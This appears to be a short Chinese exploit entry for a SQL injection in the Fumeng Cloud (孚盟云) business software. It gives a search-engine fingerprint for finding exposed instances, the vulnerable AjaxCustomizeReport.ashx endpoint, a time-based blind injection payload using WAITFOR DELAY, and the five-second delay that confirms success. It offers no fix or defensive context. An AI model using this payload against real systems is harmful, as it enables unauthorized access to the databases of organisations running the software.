# 浮盟云AjaxCustomizeReport存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxCustomizeReport.ashx HTTP/1.1`

**Payload**
```
action=GetMouldList&searchTxt='WAITFOR DELAY'0:0:5'--
```
- **响应特征**：200 响应时间>=5s